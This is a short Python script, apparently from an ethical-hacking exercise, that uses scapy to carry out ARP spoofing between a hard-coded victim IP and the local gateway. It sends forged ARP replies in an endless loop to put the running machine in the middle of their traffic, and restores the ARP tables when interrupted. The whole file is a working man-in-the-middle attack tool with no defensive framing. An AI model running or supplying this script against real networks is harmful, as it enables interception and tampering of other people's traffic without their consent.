#!/usr/bin/env python

import time

import scapy.all as scapy


def parse_arp(ans_list):
    clients_list = []
    for pkt in ans_list:
        clients_dict = {"ip": pkt[1].psrc, "mac": pkt[1].hwsrc}
        clients_list.append(clients_dict)
    return clients_list


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # append two packets
    arp_request_broadcast = broadcast / arp_request
    # srp return answered packets[0] and unaswered packets[1]
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(answered_list.summary())
    clients = parse_arp(answered_list)
    return clients[0]["mac"]


def spoof(target_IP, spoof_IP):
    packet = scapy.ARP(op=2, pdst=target_IP, hwdst=get_mac(target_IP), psrc=spoof_IP)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.0.185"
gw_ip = "192.168.0.1"
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gw_ip)
        spoof(gw_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets in total", end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] CTRL+C....user termination.")
    restore(target_ip, gw_ip)
    restore(gw_ip, target_ip)
